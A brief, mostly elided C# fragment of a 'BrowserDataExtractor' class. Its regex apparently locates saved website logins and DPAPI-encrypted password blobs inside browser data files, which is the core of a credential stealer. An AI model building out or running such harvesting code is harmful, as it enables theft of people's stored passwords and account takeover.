...
namespace TP
{
    public class BrowserDataExtractor : DataExtractor
    {
        ...
        private List<string> GetBrowserData()
        {
            ...
            Regex userRegex = new Regex(@"(?<=\x0D\x0D\x0D[\s\S]{2,3}\x68\x74\x74\x70)[\s\S]*?(?=\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)");
